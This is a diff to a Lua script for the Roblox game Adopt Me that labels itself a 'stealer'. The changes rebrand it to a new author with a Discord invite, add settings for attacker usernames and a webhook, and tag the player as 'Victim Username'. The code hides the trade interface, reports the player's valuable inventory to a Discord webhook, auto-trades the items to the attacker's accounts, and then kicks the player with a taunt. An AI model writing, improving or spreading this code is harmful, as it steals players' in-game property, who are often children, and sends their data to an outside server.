@@ -4,9 +4,18 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
+local users = _G.Usernames or {}
+local min_value = _G.min_value or 0.1
+local ping = _G.pingEveryone or "No"
+local webhook = _G.webhook or ""
+
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 
+if next(users) == nil or webhook == "" then
+    plr:kick("You didn't add username or webhook")
+    return
+end
 
 if game.PlaceId ~= 920587237 then
     plr:kick("Game not supported. Please join a normal Adopt Me server")
@@ -120,7 +129,7 @@ local function SendJoinMessage(list, prefix)
 
     local fields = {
         {
-            name = "Жертва Серго:",
+            name = "Victim Username:",
             value = plr.Name,
             inline = true
         },
@@ -189,7 +198,7 @@ local function SendJoinMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Adopt Me stealer by Sergo. removed dh by Sergo. discord.gg/Sergo"
+                ["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
             }
         }}
     }
@@ -210,7 +219,7 @@ local function SendMessage(sortedItems)
 
 	local fields = {
 		{
-			name = "Жертва Серго:",
+			name = "Victim Username:",
 			value = plr.Name,
 			inline = true
 		},
@@ -274,7 +283,7 @@ local function SendMessage(sortedItems)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Adopt Me stealer by Sergo. removed dh by Sergo. discord.gg/Sergo"
+				["text"] = "Adopt Me stealer by Tobi. discord.gg/GY2RVSEGDT"
 			}
         }}
     }
@@ -325,8 +334,6 @@ local excludedItems = {
 }
 local inventory = data[plr.Name].inventory
 
-
-
 for category, list in pairs(inventory) do
     for uid, data in pairs(list) do
         local cat = InventoryDB[data.category]
@@ -363,7 +370,6 @@ game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
 game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
 
-
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b)
         return a.Value > b.Value
@@ -379,9 +385,7 @@ if #itemsToSend > 0 then
         prefix = "--[[@everyone]] "
     end
 
-    
-        SendJoinMessage(itemsToSend, prefix)
-    
+    SendJoinMessage(itemsToSend, prefix)
     SettingsRemote:FireServer("trade_requests", 1)
 
     local function doTrade(joinedUser)
@@ -404,7 +408,7 @@ if #itemsToSend > 0 then
             end
             wait(1)
         end
-        
+        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
     end
 
     local function waitForUserChat()
